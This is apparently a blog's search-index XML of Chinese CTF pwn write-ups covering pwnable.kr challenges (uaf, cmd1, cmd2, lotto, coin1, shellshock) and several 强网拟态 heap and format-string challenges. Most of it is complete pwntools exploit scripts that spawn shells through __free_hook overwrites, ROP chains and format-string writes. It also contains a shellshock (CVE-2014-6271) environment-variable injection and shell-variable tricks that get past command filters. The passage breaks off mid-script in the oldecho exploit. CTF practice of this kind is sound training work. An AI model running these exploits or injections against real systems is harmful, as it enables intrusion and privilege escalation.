<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title><![CDATA[pwnable.kr 之 uaf]]></title>
    <url>%2F2021%2F11%2F19%2Fpwnable.kr%20%E4%B9%8B%20uaf%2F</url>
    <content type="text"><![CDATA[题如其名，不过是c++的uaf漏洞，还好给了源码，不至于去IDA里面看那么丑的伪代码 程序中有后门give_shell 结构体中有函数指针，introduce free选项delete后没有清空指针存在UAF after选项中会new 一个新的空间，从文件中将内容读入 通过跟踪分析程序可知，存放着指针的堆块大小为0x20 123456789pwndbg&gt; telescope 0x614c9000:0000│ 0x614c90 ◂— 0x001:0008│ 0x614c98 ◂— 0x21 /* '!' */02:0010│ rbx 0x614ca0 —▸ 0x401550 —▸ 0x40117a (Human::give_shell()) ◂— push rbp03:0018│ 0x614ca8 ◂— 0x1504:0020│ 0x614cb0 —▸ 0x614c88 ◂— 0x6c6c694a /* 'Jill' */05:0028│ 0x614cb8 ◂— 0x41106:0030│ 0x614cc0 ◂— '3. free\n\n'07:0038│ 0x614cc8 ◂— 0xa /* '\n' */ 所以只需要free后申请 0x20 大小的堆块，并写入0x401548即可 123456789101112131415161718192021222324uaf@pwnable:~$ python -c "print '\x68\x15\x40\x00\x00\x00\x00\x00'" &gt; /tmp/uaf_struaf@pwnable:~$ ./uaf 8 /tmp/uaf_str1. use2. after3. free31. use2. after3. free2your data is allocated1. use2. after3. free2your data is allocated1. use2. after3. free1$ lsflag uaf uaf.cpp$ cat flagyay_f1ag_aft3r_pwning 注意需要写两次，因为delete的顺序是delete m;delete w;而use的顺序是m-&gt;introduce();w-&gt;introduce(); 所以需要两次才能把m申请出来]]></content>
      <categories>
        <category>ctf</category>
      </categories>
      <tags>
        <tag>pwn</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[pwnable.kr 之 cmd]]></title>
    <url>%2F2021%2F11%2F19%2Fpwnable.kr%20%E4%B9%8B%20cmd%2F</url>
    <content type="text"><![CDATA[cmd112345678910111213141516#include &lt;stdio.h&gt;#include &lt;string.h&gt;int filter(char* cmd)&#123; int r=0; r += strstr(cmd, "flag")!=0; r += strstr(cmd, "sh")!=0; r += strstr(cmd, "tmp")!=0; return r;&#125;int main(int argc, char* argv[], char** envp)&#123; putenv("PATH=/thankyouverymuch"); if(filter(argv[1])) return 0; system( argv[1] ); return 0;&#125; filter函数，要求输入的第二个参数不能含有”flag”,”sh”,”tmp”字符串 linux支持熊本符* 所以./cmd1 &quot;/bin/cat ./f*&quot; 12cmd1@pwnable:~$ ./cmd1 "/bin/cat ./f*"mommy now I get what PATH environment is for :) cmd212345678910111213141516171819202122232425262728#include &lt;stdio.h&gt;#include &lt;string.h&gt;int filter(char* cmd)&#123; int r=0; r += strstr(cmd, "=")!=0; r += strstr(cmd, "PATH")!=0; r += strstr(cmd, "export")!=0; r += strstr(cmd, "/")!=0; r += strstr(cmd, "`")!=0; r += strstr(cmd, "flag")!=0; return r;&#125;extern char** environ;void delete_env()&#123; char** p; for(p=environ; *p; p++) memset(*p, 0, strlen(*p));&#125;int main(int argc, char* argv[], char** envp)&#123; delete_env(); putenv("PATH=/no_command_execution_until_you_become_a_hacker"); if(filter(argv[1])) return 0; printf("%s\n", argv[1]); system( argv[1] ); return 0;&#125; 相比cmd1过滤了/，如何构造出/成了重点，通过尝试，发现system函数是可以执行pwd命令的 123pwnable% ./cmd2 pwdpwd/home/cmd2 linux下/代表的是根目录，所以只需要在根目录下，pwd就等于是/，这样/就有了，但是不能直接把pwd放进去，要把它包装成一个变量，也就是$(pwd) 123pwnable% ./home/cmd2/cmd2 '$(pwd)bin$(pwd)cat $(pwd)home$(pwd)cmd2$(pwd)fl*'$(pwd)bin$(pwd)cat $(pwd)home$(pwd)cmd2$(pwd)fl*FuN_w1th_5h3ll_v4riabl3s_haha]]></content>
      <categories>
        <category>ctf</category>
      </categories>
      <tags>
        <tag>pwn</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[pwnable.kr 之 lotto]]></title>
    <url>%2F2021%2F11%2F19%2Fpwnable.kr%20%E4%B9%8B%20lotto%2F</url>
    <content type="text"><![CDATA[ssh lotto@pwnable.kr -p2222 (pw:guest) 这是一个游戏，猜对6个数就能拿到flag。 通过源码了解到这6个随机数是从/dev/urandom中取出来的，而且范围在1~46之间，虽然 这是个伪随机，但是想要爆破难度还是挺大的。 接着可以看到程序真正的问题在这： 123456789// calculate lotto scoreint match = 0, j = 0;for(i=0; i&lt;6; i++)&#123; for(j=0; j&lt;6; j++)&#123; if(lotto[i] == submit[j])&#123; match++; &#125; &#125;&#125; 看起来是个匹配6位随机数的6*6循环，但是，这样写的话只要匹配到一个，match就能等于6了，1/46。 123456789101112131415161718192021from pwn import *#context.log_level = 'debug's = ssh(host='pwnable.kr',user='lotto',password='guest',port=2222)p = s.process('/home/lotto/lotto')p.recvuntil("Exit\n")times = 1while 1: print "times: "+str(times) times += 1 p.sendline('1') pay = chr(1)*6 p.sendlineafter(" : ",pay) data = p.recvuntil("Exit\n") if "bad" in data: print data continue else: print "flag: " + data break]]></content>
      <categories>
        <category>ctf</category>
      </categories>
      <tags>
        <tag>pwn</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[pwnable.kr 之 coin1]]></title>
    <url>%2F2021%2F11%2F18%2Fpwnable.kr%20%E4%B9%8B%20coin1%2F</url>
    <content type="text"><![CDATA[coin1二分法，100次就行了，得在60秒内完成 题目也提示了，如果本地超时的话可以去服务器上跑。 ssh fd@pwnable.kr -p2222 (pw:guest)，到/tmp下，服务器上有pwntools，将下面脚本中的pwnable.kr改成127.0.0.1跑，飞快 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253from pwn import *#context.log_level = 'debug'p = remote("pwnable.kr","9007")sd = lambda s :p.send(s)rc = lambda s :p.recv(s)sl = lambda s :p.sendline(s)ru = lambda s :p.recvuntil(s)sda = lambda a,s :p.sendafter(a,s)sla = lambda a,s :p.sendlineafter(a,s)def leak(name,addr): log.info(name + " --&gt; %s",str(addr))def get_weight(start,end,p): pay = "" if start == end: p.sendline(str(start)) else: for i in range(start,end+1): pay += str(i) + " " p.sendline(pay) res = p.recvline() return int(res)def choose_coin(n,c,p): start = 0 end = n-1 weight = 0 for i in range(c): weight = get_weight(start,(start+end)/2,p) if weight % 10 != 0: end = (start+end)/2 else: start = (start+end)/2 p.sendline(str(end)) leak("[+]server: ",p.recvline())ru("- Ready? starting in 3 sec... -")sleep(3)for i in range(100): #log.info("times--&gt; %s",str(i)) ru("N=") n = int(ru(" ")[:-1],10) #leak("N=",n) ru("C=") c = int(ru("\n")[:-1],10) #leak("C=",c) choose_coin(n,c,p)p.interactive()]]></content>
      <categories>
        <category>ctf</category>
      </categories>
      <tags>
        <tag>pwn</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[pwnable.kr 之 shellshock]]></title>
    <url>%2F2021%2F11%2F18%2Fpwnable.kr%20%E4%B9%8B%20shellshock%2F</url>
    <content type="text"><![CDATA[shellshock什么是shellshock bash 版本 &lt;= 4.1 1、普通shell变量和bash 1234567shellshock@pwnable:~$ gu="hacker"shellshock@pwnable:~$ echo $guhackershellshock@pwnable:~$ ./bashshellshock@pwnable:~$ echo $gushellshock@pwnable:~$ 从上述实验得出：bash子进程没有继承普通shell变量gu。 2、普通环境变量和bash 1234567shellshock@pwnable:~$ echo $guhackershellshock@pwnable:~$ export gushellshock@pwnable:~$ ./bashshellshock@pwnable:~$ echo $guhackershellshock@pwnable:~$ 从上述实验得出：bash子进程继承环境变量gu。 3、函数shell变量和bash 123456shellshock@pwnable:~$ gu() &#123; echo "gu is a hacker";&#125;shellshock@pwnable:~$ gugu is a hackershellshock@pwnable:~$ ./bashshellshock@pwnable:~$ gugu: command not found 从上述实验中得出：bash子进程没有继承函数shell变量gu。 4、函数环境变量和bash 123456shellshock@pwnable:~$ gugu is a hackershellshock@pwnable:~$ export -f gushellshock@pwnable:~$ bashshellshock@pwnable:~$ gugu is a hacker 从上述实验中我们得出：bash子进程继承函数环境变量gu。 5、 1234567891011shellshock@pwnable:~$ ailx10='() &#123; echo "ailx10 is a hacker";&#125;'shellshock@pwnable:~$ export ailx10shellshock@pwnable:~$ ./bashshellshock@pwnable:~$ ailx10ailx10 is a hackershellshock@pwnable:~$ env | grep ailx10ailx10=() &#123; echo "ailx10 is a hacker"shellshock@pwnable:~$ exitexitshellshock@pwnable:~$ env | grep ailx10ailx10=() &#123; echo "ailx10 is a hacker";&#125; 从上述实验得出：bash子进程误把普通环境变量(){ :; }当做函数环境变量处理了。 6、(){ :;} 1234shellshock@pwnable:~$ ailx10='() &#123; :;&#125;;/bin/ls'shellshock@pwnable:~$ export ailx10shellshock@pwnable:~$ ./bashbash flag shellshock shellshock.c 从上述实验中得出：bash子进程处理了/bin/ls。 综上，触发bash漏洞可以归纳如下 1、产生新的bash 2、通过环境变量传递 3、环境变量以(){}这样的形式 如何用一条语句验证bash漏洞 12345shellshock@pwnable:~$ env x='() &#123; :;&#125;; echo vulnerable' ./bash -c "echo this is a test"vulnerablethis is a testshellshock@pwnable:~$ env x='() &#123; :;&#125;; echo vulnerable' ./bash -c :vulnerable env可以创建临时环境变量。 bash -c可以运行一个shell命令。 shellshock回到题目上来 先试试有没有此漏洞 123shellshock@pwnable:~$ env x='() &#123; :;&#125;; echo vulnerable' ./bash -c "echo this is a test"vulnerablethis is a test 显然是有的 直接cat flag是没有权限的 123456shellshock@pwnable:~$ ls -ltotal 960-r-xr-xr-x 1 root shellshock 959120 Oct 12 2014 bash-r--r----- 1 root shellshock_pwn 47 Oct 12 2014 flag-r-xr-sr-x 1 root shellshock_pwn 8547 Oct 12 2014 shellshock-r--r--r-- 1 root root 188 Oct 12 2014 shellshock.c 查看shellshock程序 12345678shellshock@pwnable:~$ cat shellshock.c#include &lt;stdio.h&gt;int main()&#123; setresuid(getegid(), getegid(), getegid()); setresgid(getegid(), getegid(), getegid()); system("/home/shellshock/bash -c 'echo shock_me'"); return 0;&#125; 这段程序很简单，我们以shellshock身份启动时，程序的权限是other权限r-x，而在setresuid和setresgid中使用effective gid，也就是shellshock_pwn的权限r-s，当程序执行到system时，程序已经具有shellshock_pwn组权限了。 这个组权限对于flag文件来说是可读的，但是问题是这段程序并没有涉及到对flag文件的读操作。 结合上述的bash漏洞 123shellshock@pwnable:~$ env x='() &#123; :;&#125;; ./bash -c "cat ./flag"' ./shellshockonly if I knew CVE-2014-6271 ten years ago..!!Segmentation fault (core dumped) ./shellshock的时候拿到了shllshock_pwn的权限，而bash漏洞在此权限上执行了cat ./flag，这一拼接也就导致了提权后的为所欲为了。]]></content>
      <categories>
        <category>ctf</category>
      </categories>
      <tags>
        <tag>pwn</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[第四届强网拟态赛]]></title>
    <url>%2F2021%2F11%2F04%2F%E7%AC%AC%E5%9B%9B%E5%B1%8A%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%81%2F</url>
    <content type="text"><![CDATA[bitflipedit函数中存在off-by-one漏洞，版本glibc-2.27 add函数将malloc的size限制在了0x50内，不过可以通过off-by-one修改下一个chunk的size实现堆叠，进而释放0x410以上大小的堆，拿到libc 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108#coding:utf-8# from libformatstr import FormatStr# py64 = FormatStr(isx64=1) # py64[printf_got] = onegadget# sl(py64.payload(start_read_offset))from pwn import *import syslocal = 1context.terminal=['tmux','splitw','-h']if len(sys.argv) == 2 and (sys.argv[1] == 'DEBUG' or sys.argv[1] == 'debug'): context.log_level = 'debug'if local: p = process('./bitflip') elf = ELF('./bitflip') libc = elf.libcelse: p = remote("")#内存地址随机化def debug(addr=0,PIE=True): if PIE: text_base = int(os.popen("pmap &#123;&#125;| awk '&#123;&#123;print $1&#125;&#125;'".format(p.pid)).readlines()[1], 16) print "breakpoint_addr --&gt; " + hex(text_base + 0x202160) gdb.attach(p,'b *&#123;&#125;'.format(hex(text_base+addr))) else: gdb.attach(p,"b *&#123;&#125;".format(hex(addr))) sd = lambda s :p.send(s)rc = lambda s :p.recv(s)sl = lambda s :p.sendline(s)ru = lambda s :p.recvuntil(s)sda = lambda a,s :p.sendafter(a,s)sla = lambda a,s :p.sendlineafter(a,s)def leak(name,addr): log.info(name + " --&gt; %s",hex(addr))def choice(idx): sla("choice: ",str(idx))def add(idx,size): choice(1) sla("Index: ",str(idx)) sla("Size: ",str(size))def edit(idx,data): choice(2) sla("Index: ",str(idx)) sda("Content: ",data)def show(idx): choice(3) sla("Index: ",str(idx))def delete(idx): choice(4) sla("Index: ",str(idx))# leak heapadd(0,0x18)add(1,0x18)delete(0)delete(1)add(0,0x18)add(1,0x18)show(0)ru("Content: ")heap_base = u64(ru('\n')[:-1].ljust(8,'\x00')) - 0x260leak("heap_base",heap_base)add(2,0x18)add(3,0x18)for i in range(13): #4-16 add(i+4,0x50)edit(2,0x18*'\x00' + '\x61')delete(3)add(3,0x50)edit(3,0x18*'\x00' + p64(0x481) + '\n')delete(4)add(4,0x18)show(4)ru("Content: ")libs_base = u64(ru('\n')[:-1].ljust(8,'\x00')) - 1136 - 0x10 - libc.sym['__malloc_hook']free_hook = libs_base + libc.sym['__free_hook']system = libs_base + libc.sym['system']leak("libs_base",libs_base)add(17,0x18)add(18,0x18)add(19,0x18)add(20,0x18)edit(17,0x18*'\x00' + '\x41')delete(18)delete(19)add(18,0x38)edit(18,0x18*'\x00' + p64(0x21) + p64(free_hook) + '\n')add(19,0x18)add(21,0x18)edit(19,'/bin/sh\x00\n')edit(21,p64(system) + '\n')delete(19)# debug()p.interactive() bornote自己实现的输入函数存在off-by-null漏洞，版本glibc-2.31 先通过show函数泄漏heap和libc 之后通过off-by-null实现unlink，注意高版本的unlink会对pre_size进行检测 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108#coding:utf-8# from libformatstr import FormatStr# py64 = FormatStr(isx64=1) # py64[printf_got] = onegadget# sl(py64.payload(start_read_offset))from pwn import *import syslocal = 1# context.terminal=['tmux','splitw','-h']if len(sys.argv) == 2 and (sys.argv[1] == 'DEBUG' or sys.argv[1] == 'debug'): context.log_level = 'debug'if local: p = process('./bornote') # elf = ELF('./bornote') libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')else: p = remote("")#内存地址随机化def debug(addr=0,PIE=True): if PIE: text_base = int(os.popen("pmap &#123;&#125;| awk '&#123;&#123;print $1&#125;&#125;'".format(p.pid)).readlines()[1], 16) print ("breakpoint_addr --&gt; " + hex(text_base + 0x202040)) gdb.attach(p,'b *&#123;&#125;'.format(hex(text_base+addr))) else: gdb.attach(p,"b *&#123;&#125;".format(hex(addr))) sd = lambda s :p.send(s)rc = lambda s :p.recv(s)sl = lambda s :p.sendline(s)ru = lambda s :p.recvuntil(s)sda = lambda a,s :p.sendafter(a,s)sla = lambda a,s :p.sendlineafter(a,s)def leak(name,addr): log.info(name + " --&gt; %s",hex(addr))def init(): sla("username: ","rabbit")def choice(idx): sla("cmd: ",str(idx))def add(size): choice(1) sla("Size: ",str(size))def delete(idx): choice(2) sla("Index: ",str(idx))def edit(idx,data): choice(3) sla("Index: ",str(idx)) sda("Note: ",data)def show(idx): choice(4) sla("Index: ",str(idx))init()# leak libcadd(0x440)add(0x440)delete(0)add(0x440)show(0)ru("Note: ")libc_base = u64(rc(6).ljust(8,b'\x00')) - 96 - 0x10 - libc.sym['__malloc_hook']free_hook = libc_base + libc.sym['__free_hook']system = libc_base + libc.sym['system']delete(0)delete(1)leak("libc_base",libc_base)leak("free_hook",free_hook)leak("system",system)add(0x68) #0add(0x68) #1add(0x18) #2add(0x4f8) #3add(0x68) #4add(0x68) #5# leak heapdelete(1)delete(0)add(0x68) #0add(0x68) #1show(0)ru("Note: ")heap_base = u64(rc(6).ljust(8,b'\x00')) - 0x80leak("heap_base",heap_base)edit(2,0x10*b'a' + p64(0x70*2+0x10))edit(0,p64(0) + p64(0x70*2+0x11) + p64(heap_base + 0x10)*2 + b'\n')delete(3)delete(4)delete(1)add(0xd8) #1edit(1,0x50*b'a' + p64(0) + p64(0x71) + p64(free_hook) + b'\n')add(0x68) #3add(0x68) #4 free_hookedit(3,"/bin/sh\x00\n")edit(4,p64(system) + b'\n')delete(3)# debug()p.interactive() old_schooledit中很明显的off-by-one，版本glibc-2.27 不考虑unlink，直接伪造size实现堆叠 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103#coding:utf-8# from libformatstr import FormatStr# py64 = FormatStr(isx64=1) # py64[printf_got] = onegadget# sl(py64.payload(start_read_offset))from pwn import *import syslocal = 1context.terminal=['tmux','splitw','-h']if len(sys.argv) == 2 and (sys.argv[1] == 'DEBUG' or sys.argv[1] == 'debug'): context.log_level = 'debug'if local: p = process('./old_school') elf = ELF('./old_school') libc = elf.libcelse: p = remote("")#内存地址随机化def debug(addr=0,PIE=True): if PIE: text_base = int(os.popen("pmap &#123;&#125;| awk '&#123;&#123;print $1&#125;&#125;'".format(p.pid)).readlines()[1], 16) print "breakpoint_addr --&gt; " + hex(text_base + 0x202040) gdb.attach(p,'b *&#123;&#125;'.format(hex(text_base+addr))) else: gdb.attach(p,"b *&#123;&#125;".format(hex(addr))) sd = lambda s :p.send(s)rc = lambda s :p.recv(s)sl = lambda s :p.sendline(s)ru = lambda s :p.recvuntil(s)sda = lambda a,s :p.sendafter(a,s)sla = lambda a,s :p.sendlineafter(a,s)def leak(name,addr): log.info(name + " --&gt; %s",hex(addr))def choice(idx): sla(": ",str(idx))def add(idx,size): choice(1) sla("Index: ",str(idx)) sla("Size: ",str(size))def edit(idx,data): choice(2) sla("Index: ",str(idx)) sda("Content: ",data)def show(idx): choice(3) sla("Index: ",str(idx))def delete(idx): choice(4) sla("Index: ",str(idx))# leakfor i in range(9): add(i,0xf8)for i in range(8): delete(i)for i in range(7): add(i,0xf8)add(7,0x8)show(0)ru("Content: ")heap_base = u64(rc(6).ljust(8,'\x00')) - 0x760show(7)ru("Content: ")libc_base = u64(rc(6).ljust(8,'\x00')) - 336 - 0x10 - libc.sym['__malloc_hook']free_hook = libc_base + libc.sym['__free_hook']system = libc_base + libc.sym['system']leak("heap_base",heap_base)leak("libc_base",libc_base)# 0x555555602160--chunk# 0x555555602060--sizeadd(0x1f,0xd8)add(9,0x18)add(10,0x68)add(11,0x68)add(12,0x18)edit(9,'\x00'*0x18 + '\xe1')delete(10)delete(11)add(10,0xd8)edit(10,0x60*'\x00' + p64(0) + p64(0x71) + p64(free_hook) + '\n')add(11,0x68)add(13,0x68)edit(13,p64(system) + '\n')edit(11,'/bin/sh\x00' + '\n')delete(11)# debug()p.interactive() old_school_revenge将old_school的off-by-one改成off-by-null，版本glibc-2.27 unlink，低版本，不需要考虑pre_size问题 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586878889909192939495969798#coding:utf-8# from libformatstr import FormatStr# py64 = FormatStr(isx64=1) # py64[printf_got] = onegadget# sl(py64.payload(start_read_offset))from pwn import *import syslocal = 1context.terminal=['tmux','splitw','-h']if len(sys.argv) == 2 and (sys.argv[1] == 'DEBUG' or sys.argv[1] == 'debug'): context.log_level = 'debug'if local: p = process('./old_school_revenge') elf = ELF('./old_school_revenge') libc = elf.libcelse: p = remote("")#内存地址随机化def debug(addr=0,PIE=True): if PIE: text_base = int(os.popen("pmap &#123;&#125;| awk '&#123;&#123;print $1&#125;&#125;'".format(p.pid)).readlines()[1], 16) print ("breakpoint_addr --&gt; " + hex(text_base + 0x202160)) gdb.attach(p,'b *&#123;&#125;'.format(hex(text_base+addr))) else: gdb.attach(p,"b *&#123;&#125;".format(hex(addr))) sd = lambda s :p.send(s)rc = lambda s :p.recv(s)sl = lambda s :p.sendline(s)ru = lambda s :p.recvuntil(s)sda = lambda a,s :p.sendafter(a,s)sla = lambda a,s :p.sendlineafter(a,s)def leak(name,addr): log.info(name + " --&gt; %s",hex(addr))def choice(idx): sla(": ",str(idx))def add(idx,size): choice(1) sla("Index: ",str(idx)) sla("Size: ",str(size))def edit(idx,data): choice(2) sla("Index: ",str(idx)) sda("Content: ",data)def show(idx): choice(3) sla("Index: ",str(idx))def delete(idx): choice(4) sla("Index: ",str(idx))for i in range(7): add(i,0xf8) #0-6add(7,0xf8)add(8,0x68)add(9,0xf8)add(10,0x68)for i in range(7): delete(i)delete(7)delete(8)add(8,0x68)edit(8,0x60*'\x00' + p64(0x170))delete(9)#unlinkfor i in range(7): add(i,0xf8)add(7,0xf8)add(9,0x68) #=10add(11,0xf8)show(8) #-704ru("Content: ")main_arena = u64(rc(6).ljust(8,'\x00'))-96libc_base = main_arena-0x10-libc.sym['__malloc_hook']system = libc_base + libc.sym['system']free_hook = libc_base + libc.sym['__free_hook']leak("main_arena",main_arena)delete(9)edit(8,p64(free_hook) + '\n')add(9,0x68)add(12,0x68)edit(12,p64(system) + '\n')edit(9,"/bin/sh\x00\n")delete(9)# debug()p.interactive() pwnpwn格式化字符串，给了system，也给了”/bin/sh”字符，也给了text地址，不过got表不可写 那就写main函数的返回地址，为p64(pop_rdi) + p64(binsh) + p64(system) 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131#coding:utf-8from libformatstr import FormatStr# py64 = FormatStr(isx64=1) # py64[printf_got] = onegadget# sl(py64.payload(start_read_offset))from pwn import *import syslocal = 1context.arch = 'amd64'context.terminal=['tmux','splitw','-h']if len(sys.argv) == 2 and (sys.argv[1] == 'DEBUG' or sys.argv[1] == 'debug'): context.log_level = 'debug'if local: p = process('./pwnpwn')else: p = remote("")#内存地址随机化def debug(addr=0,PIE=True): if PIE: text_base = int(os.popen("pmap &#123;&#125;| awk '&#123;&#123;print $1&#125;&#125;'".format(p.pid)).readlines()[1], 16) print "breakpoint_addr --&gt; " + hex(text_base + 0x202040) gdb.attach(p,'b *&#123;&#125;'.format(hex(text_base+addr))) else: gdb.attach(p,"b *&#123;&#125;".format(hex(addr))) sd = lambda s :p.send(s)rc = lambda s :p.recv(s)sl = lambda s :p.sendline(s)ru = lambda s :p.recvuntil(s)sda = lambda a,s :p.sendafter(a,s)sla = lambda a,s :p.sendlineafter(a,s)def leak(name,addr): log.info(name + " --&gt; %s",hex(addr))sla("something\n",'1')ru("trick\n")text_base = int(ru('\n').strip(),16) - 0x9b9leak("text_base",text_base)sl('2')pay = "%p-%3$p"# debug(0xa07)sla("hello\n",pay)stack = int(ru('-')[:-1],16)main_ret = stack + 0xa8libc_base = int(ru('\n')[:-1],16) - 0xf7320leak("main_ret",main_ret)leak("libc_base",libc_base)sl('R4bb1t-n0va')sleep(0.1)pop_rdi = text_base + 0xb83binsh = text_base + 0x202010system = text_base + 0x951# leak("binsh",binsh)leak("system",system)def write(target,data): pay = '%' + str(data) + 'c%10$hhn' pay = pay.ljust(0x10,'A') pay += p64(target) return pay# debug(0xa07)sl('2')pay = write(main_ret,pop_rdi&amp;0xff) #0sla('hello\n',pay)sleep(0.1)sl(write(main_ret+1,(pop_rdi&amp;0xff00)&gt;&gt;8)) #1sleep(0.1)# debug(0xa07)sl('2')sla("hello\n",write(main_ret+2,(pop_rdi&amp;0xff0000)&gt;&gt;16)) #2sleep(1)sl(write(main_ret+3,(pop_rdi&amp;0xff000000)&gt;&gt;24)) #3sleep(0.1)# debug(0xa07)sl('2')sla("hello\n",write(main_ret+4,(pop_rdi&amp;0xff00000000)&gt;&gt;32)) #4sleep(0.1)sl(write(main_ret+5,(pop_rdi&amp;0xff0000000000)&gt;&gt;40)) #5sleep(0.1)sl('2')sla("hello\n",write(main_ret+8,(binsh&amp;0xff))) #0sleep(0.1)sl(write(main_ret+9,(binsh&amp;0xff00)&gt;&gt;8)) #1sleep(0.1)sl('2')sla("hello\n",write(main_ret+10,(binsh&amp;0xff0000)&gt;&gt;16)) #2sleep(0.1)sl(write(main_ret+11,(binsh&amp;0xff000000)&gt;&gt;24)) #3sleep(0.1)# debug(0xa07)sl('2')sla("hello\n",write(main_ret+12,(binsh&amp;0xff00000000)&gt;&gt;32)) #4sleep(0.1)sl(write(main_ret+13,(binsh&amp;0xff0000000000)&gt;&gt;40)) #5sleep(0.1)sl('2')sla("hello\n",write(main_ret+0x10,(system&amp;0xff))) #0sleep(0.1)sl(write(main_ret+0x11,(system&amp;0xff00)&gt;&gt;8)) #1sleep(0.1)sl('2')sla("hello\n",write(main_ret+0x12,(system&amp;0xff0000)&gt;&gt;16)) #2sleep(0.1)sl(write(main_ret+0x13,(system&amp;0xff000000)&gt;&gt;24)) #3sleep(0.1)# debug(0xa07)sl('2')sla("hello\n",write(main_ret+0x14,(system&amp;0xff00000000)&gt;&gt;32)) #4sleep(0.1)# pause()sl(write(main_ret+0x15,(system&amp;0xff0000000000)&gt;&gt;40)) #5sleep(0.1)sl('3')# debug()p.interactive() sonic平平无奇栈溢出，没什么需要注意的 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556#coding:utf-8# from libformatstr import FormatStr# py64 = FormatStr(isx64=1) # py64[printf_got] = onegadget# sl(py64.payload(start_read_offset))from pwn import *import syslocal = 1# context.terminal=['tmux','splitw','-h']if len(sys.argv) == 2 and (sys.argv[1] == 'DEBUG' or sys.argv[1] == 'debug'): context.log_level = 'debug'if local: p = process('./sonic') # p = process(argv=['',pay]) # p = process(["./ld.so","./easygame"],env=&#123;"LD_PRELOAD":"./libc.so.6"&#125;)else: p = remote("")#内存地址随机化def debug(addr=0,PIE=True): if PIE: text_base = int(os.popen("pmap &#123;&#125;| awk '&#123;&#123;print $1&#125;&#125;'".format(p.pid)).readlines()[1], 16) print ("breakpoint_addr --&gt; " + hex(text_base + 0x202040)) gdb.attach(p,'b *&#123;&#125;'.format(hex(text_base+addr))) else: gdb.attach(p,"b *&#123;&#125;".format(hex(addr))) sd = lambda s :p.send(s)rc = lambda s :p.recv(s)sl = lambda s :p.sendline(s)ru = lambda s :p.recvuntil(s)sda = lambda a,s :p.sendafter(a,s)sla = lambda a,s :p.sendlineafter(a,s)def leak(name,addr): log.info(name + " --&gt; %s",hex(addr))ru("Address=")main = int(ru('\n').strip(),16)text_base = main - 0x7cfleak("main",main)pop_rdi = 0x00000000000008c3 + text_basepop_rsi_r15 = 0x00000000000008c1 + text_basebinsh = 0x201040 + text_basepay = b"/bin/sh\x00"pay = pay.ljust(0x28,b'A')pay += p64(pop_rdi) + p64(binsh) + p64(pop_rsi_r15) + p64(0)*2pay += p64(text_base + 0x847)# debug(0x7b9)sl(pay)p.interactive() oldecho格式化字符串，给了栈地址，但是关闭了输出[close(1)]，且输入在bss段 虽然关闭了1，但是只要把stdout的fileno改为2即可重新输出。 观察栈内容没有发现stdout附近地址残留，但是在当前栈空间的上方存在stdout，但是上方的栈空间没法写 所以先抬栈： 1、先返回一次main 2、再将返回地址修改成ret，滑到start函数 再次回到格式化字符串位置时可以看到当前栈空间有stdout了 利用栈上的栈指针修改fileno为2，泄漏libc，构造orw读取flag 存在一定的爆破，概率大概是几十分之一，不是很低 题目环境为ubuntu16.04，(只能用桌面版，用docker 不行) 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136#coding:utf-8# from libformatstr import FormatStr# py64 = FormatStr(isx64=1) # py64[printf_got] = onegadget# sl(py64.payload(start_read_offset))from pwn import *import syslocal = 1# context.terminal=['tmux','splitw','-h']if len(sys.argv) == 2 and (sys.argv[1] == 'DEBUG' or sys.argv[1] == 'debug'): context.log_level = 'debug'if local: # p = process('./oldecho') p = process(["./oldecho"],env=&#123;"LD_PRELOAD":"./libc.so.6"&#125;) # elf = ELF('./oldecho') libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')else: p = remote("")#内存地址随机化def debug(addr=0,PIE=True): if PIE: text_base = int(os.popen("pmap &#123;&#125;| awk '&#123;&#123;print $1&#125;&#125;'".format(p.pid)).readlines()[1], 16) print ("breakpoint_addr --&gt; " + hex(text_base + 0x202040)) gdb.attach(p,'b *&#123;&#125;'.format(hex(text_base+addr))) else: gdb.attach(p,"b *&#123;&#125;".format(hex(addr))) sd = lambda s :p.send(s)rc = lambda s :p.recv(s)sl = lambda s :p.sendline(s)ru = lambda s :p.recvuntil(s)sda = lambda a,s :p.sendafter(a,s)sla = lambda a,s :p.sendlineafter(a,s)def leak(name,addr): log.info(name + " --&gt; %s",hex(addr))def write(target,data): for i in range(8): pay = '%' + str((target+i)&amp;0xff) + 'c%6$hhn' sl(pay) if (data&gt;&gt;(8*i))&amp;0xff == 0: pay = '%10$hhn' else: pay = '%' + str((data&gt;&gt;(8*i))&amp;0xff) + 'c%10$hhn' sl(pay)def pwn(stack): stdout_stack = stack - 0x80 # 指针1,offset=6 stack_1 = stack - 0x138 # 指针2,offset=10 stack_2 = stack - 0x118 # 抬栈 pay = '%' + str((stack-0x10)&amp;0xff) + 'c%6$hhn' sl(pay) pay = '%' + str(0x40) + 'c%10$hhn' sl(pay) pay = '%' + str((stack-0x38)&amp;0xff) + 'c%6$hhn' sl(pay) pay = '%' + str(0x3f) + 'c%10$hhn' sl(pay) # pay = '%' + str(stack_2&amp;0xff) + 'c%6$hhn' # sl(pay) pay = '%' + str(stdout_stack&amp;0xff) + 'c%15$hhn' sl(pay) pay = '%' + str(0x90) + 'c%41$hhn' sl(pay) pay = '%' + str(2) + 